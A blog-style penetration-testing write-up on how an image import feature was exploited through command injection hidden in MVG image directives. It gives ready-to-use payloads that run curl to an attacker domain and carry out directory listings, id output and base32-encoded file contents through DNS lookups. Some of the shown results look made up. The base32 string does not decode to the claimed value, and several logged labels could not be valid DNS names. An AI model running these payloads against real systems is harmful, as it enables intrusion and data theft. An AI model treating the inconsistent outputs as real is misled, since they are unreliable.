# Uploading an Image Was All I Needed for Full Server Access



Hey everyone,

I’m back with another interesting finding. This time we’re diving into a classic image processing vulnerability that’s still lurking in production systems.

Grab your coffee and let’s get into it.

## The Discovery

While testing a photography portfolio platform, I came across a feature that allowed photographers to add images to their gallery using an “Import from URL” option.

The feature worked like this:

```url
https://target.com/portfolio/import?image_url=http://attacker.com/photo.jpg
```

The server would fetch the image, process it, and add it to the user’s gallery.

But here’s where things got interesting. When I tested it with a legitimate image URL, I noticed the application wasn’t just linking to my URL. Instead, it was processing the image and storing it on their own servers. My test image from Google ended up hosted at:

```url
https://cdn.target.com/galleries/user123/processed_abc123.jpg
```

This meant the application was performing server-side image processing — a classic high-risk area.

## Understanding the Infrastructure

To understand how this worked internally, I set up a simple listener on my own server:

```bash
nc -lvvv 8088
```

Then I pointed the `image_url` parameter to my server.

Within seconds, I received a request:

```http
GET /test.png HTTP/1.1
User-Agent: ImageProcessor/2.0
Accept: */*
Accept-Encoding: deflate, gzip
Host: attacker.com
Connection: keep-alive
```

The request came from their infrastructure with a custom user agent suggesting specialized image processing software. This looked like a properly isolated image processing server, which is actually good security practice, but it doesn’t mean it’s invulnerable.

## The First Attack Vector

My first thought was SVG-based attacks. SVG files are XML by design, which means they can sometimes be exploited for Server-Side Request Forgery (SSRF) or XML External Entity (XXE) attacks. I crafted a malicious SVG and submitted it, but nothing happened. The application either wasn’t processing SVG files or had proper protections in place.

Time for plan B.

## Triggering Command Execution
I crafted a malicious image file containing embedded image processing directives designed to trigger command execution when parsed by a vulnerable library.

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`curl "http://attacker.com/" -d @- > /dev/null`'
pop graphic-context
```

The exploit works by crafting a specially formatted image file that contains shell commands embedded in the processing instructions. When the vulnerable library processes this file, it interprets those backticks and executes the command.

I saved this as `exploit.png` and submitted it through the `image_url` parameter. Then I waited at my listener:

```bash
nc -lvvv 80
```

And waited… and waited… Nothing. No connection. No callback.

Facepalm moment.

## The Critical Question

Then a key question clicked:

**What if command execution works, but outbound HTTP traffic is blocked?**

This is actually very common. Many environments block outbound HTTP/HTTPS to prevent malware callbacks and data exfiltration.

But there’s one protocol almost always allowed: **DNS**.

## Enter DNS Exfiltration
DNS exfiltration is one of those techniques that sounds complex but is actually beautifully simple. The idea is to use DNS queries to smuggle data out of a restricted network. Even if all outbound HTTP/HTTPS ports are blocked, DNS usually works because servers need it to function.

Here’s how it works. You control a domain and set up your own DNS server. When you execute commands on the target server, instead of making HTTP requests, you make DNS queries to subdomains of your domain. Your DNS server logs these queries, effectively transmitting data through DNS lookups.

For example, if you want to send the word “test”, you make a DNS query for `test.attacker.com`. Your DNS server receives and logs this query, and boom, you've exfiltrated data.

Why does this work so well? DNS is essential for almost every server operation, it’s rarely blocked, often unmonitored, requires no authentication, and works through pretty much any firewall. Port 53 is almost always allowed outbound.

## Testing the Theory

I modified my payload to test this DNS exfiltration theory:

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`curl "http://test.attacker.com/" -d @- > /dev/null`'
pop graphic-context
```

Where `attacker.com` is a domain I control with custom DNS logging enabled. I submitted the exploit and checked my DNS logs...

```text
IP: XX.XX.XX.XX
Query: test.attacker.com, Type: A
```

Bingo! The server made a DNS query to my domain. This confirmed three critical things: the image processing library was vulnerable, command execution was possible, and while outbound HTTP was blocked, DNS queries were going through just fine.

## Building the Full Exploit

Now that I had confirmed command execution, I needed to prove the impact. But I couldn’t just use regular HTTP requests — I had to exfiltrate data through DNS queries.

### Mapping the Filesystem

I crafted a payload to list directory contents:

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`for i in $(ls /); do curl "http://$i.attacker.com/" -d @- > /dev/null; done`'
pop graphic-context
```

This clever payload executes `ls /` to list the root directory, then for each file or folder, it makes a DNS query like `home.attacker.com`, `bin.attacker.com`, etc. My DNS server logs these queries, revealing the directory structure.

The results started flowing in:

```text
Query: home.attacker.com, Type: A
Query: boot.attacker.com, Type: A
Query: dev.attacker.com, Type: A
Query: bin.attacker.com, Type: A
Query: etc.attacker.com, Type: A
Query: usr.attacker.com, Type: A
```

Perfect! I could see the entire filesystem structure through DNS queries.

### Identifying the User Context

Next, I wanted to gather more information about the server environment. I executed the `id` command to see what user the process was running as:

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | tr " " "\n" | while read line; do curl "http://$line.attacker.com/" > /dev/null 2>&1; done`'
pop graphic-context
```

The DNS logs showed:

```text
Query: uid=99(nobody).attacker.com, Type: A
Query: gid=99(nobody).attacker.com, Type: A
Query: groups=99(nobody).attacker.com, Type: A
```

The process was running as `nobody`, a low-privileged user. Still, that's enough to read configuration files and potentially access sensitive data.

### Exfiltrating File Contents

Now I needed to exfiltrate actual file contents. But there’s a challenge here: DNS queries have character limitations and special characters can break the query.

The solution? **Base32 encoding.**

Base32 is actually better than Base64 for DNS exfiltration. It only uses alphanumeric characters (A-Z, 2–7), has no special characters that could break DNS queries, and is more reliable for encoding arbitrary data.

Here’s my final payload:

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`cat /etc/hostname | base32 | while read line; do curl "http://$line.attacker.com/" > /dev/null 2>&1; done`'
pop graphic-context
```

My DNS logs would then show queries like:

```text
Query: JBSWY3DPEBLW64TMMQ====.attacker.com, Type: A
```

I could decode this back to get the original data:

```bash
echo "JBSWY3DPEBLW64TMMQ====" | base32 -d
# Output: hostname-value
```

This technique successfully exfiltrated file contents from the server, proving full remote code execution with the ability to access sensitive system information even through network egress restrictions.

---
Thanks for reading!
